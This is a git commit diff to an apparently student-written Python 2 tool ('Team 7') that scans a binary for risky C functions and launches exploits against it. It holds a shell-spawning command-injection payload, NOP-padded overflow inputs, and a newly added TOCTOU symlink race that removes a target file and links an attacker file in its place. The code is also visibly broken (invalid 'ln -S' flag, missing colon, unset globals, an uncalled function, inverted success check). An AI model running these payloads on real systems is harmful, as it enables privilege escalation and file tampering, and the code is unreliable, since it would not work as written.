b0d672414134175c374914f046cf06596bf4870b
Maria Castro <thepanopticons@gmail.com>
2020-02-20 23:07:03 -0600

    toctou update
    added code for toctou exploit

--- victim_vul_identification_tool.py
+++ victim_vul_identification_tool.py
@@ -1,5 +1,23 @@
+#!/usr/bin/python
 import sys
 import os
+import os.path
+
+alias_create_link = ""
+alias_delete_link = ""
+file_to_check = '"'
+
+def set_up_toctou_attempt():
+	file_to_check = raw_input("Enter file (with path) to try to target")
+	exploit = raw_input("Enter exploit file (with path)")
+	alias_create_link = "ln -S " + exploit + file_to_check
+	alias_delete_link = "rm " + file_to_check
+	print "Ready for toctou attempt"
+
+def toctou_attempt():
+	if os.path.isfile(file_to_check)
+		os.system(alias_delete_link)
+	os.system(alias_create_link)
 
 def inject_gets(buffers): 	
 	for buf in buffers:
@@ -14,7 +32,6 @@ def inject_scanf(buffers):
 		print buf
 		scanf_exploit(buf)
 		
-
 def gets_exploit(buf_size):
 	exploit = "\x90"*buf_size
 	result = os.system("echo " + exploit + " > exploit.txt && ./"+sys.argv[1]+ " $(cat exploit.txt)")
@@ -26,7 +43,8 @@ def gets_exploit(buf_size):
 
 def scanf_exploit(buf_size):
 	exploit = "1"*buf_size
-	result = os.system("echo " + exploit + " > exploit.txt && ./"+sys.argv[1]
+	result = os.system("echo " + exploit + " > exploit.txt && ./"+sys.argv[1])
+	if result != 0:
 		print "Success"
 	else:
 		print "Fail"
@@ -35,8 +53,8 @@ def inject_execl():
 	exploit = ";`/bin/sh`"
 	os.system("echo " + exploit + " > exploit.txt && ./"+sys.argv[1]+ " $(cat exploit.txt)")
 	
-
-vulnerabilities = filter(None, os.popen('objdump -M Intel -d '+ sys.argv[1] + ' | grep -oP "(gets|scanf|strcpy|memcpy|printf|system|fgets|gets|execl)"').read().split('\n'))
+# added access function
+vulnerabilities = filter(None, os.popen('objdump -M Intel -d '+ sys.argv[1] + ' | grep -oP "(gets|scanf|strcpy|memcpy|printf|system|fgets|gets|execl|access)"').read().split('\n'))
 vulnerabilities = list(set(filter(None, vulnerabilities)))
 
 print "Team 7 below is the list of suspected vulnerabilites to look at:\n" + str(vulnerabilities)
@@ -57,4 +75,8 @@ for suspect_func in vulnerabilities:
 	elif suspect_func == "execl":
 	    inject_execl()
 	    break
-	    
+	elif suspect_func == "access":
+		set_up_toctou_attempt()
+		break
+	else:
+		print "No known vulnerability found"
